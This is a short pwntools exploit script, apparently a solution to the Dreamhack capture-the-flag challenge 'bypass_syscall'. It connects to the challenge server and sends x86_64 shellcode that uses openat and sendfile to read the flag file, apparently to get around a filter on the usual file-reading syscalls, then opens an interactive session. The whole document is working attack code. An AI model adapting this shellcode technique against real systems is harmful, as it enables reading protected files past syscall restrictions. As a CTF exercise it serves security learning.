from pwn import *

context.arch = 'x86_64'

# p = process("./bypass_syscall")

# nc host3.dreamhack.games 22526
p = remote("host3.dreamhack.games", 22526)

shellcode = shellcraft.openat(0, "/home/bypass_syscall/flag", 0)
shellcode += shellcraft.sendfile(1, 'rax', 0, 100)
# shellcode = shellcraft.cat("./flag")

p.sendafter("e:",asm(shellcode))
p.interactive()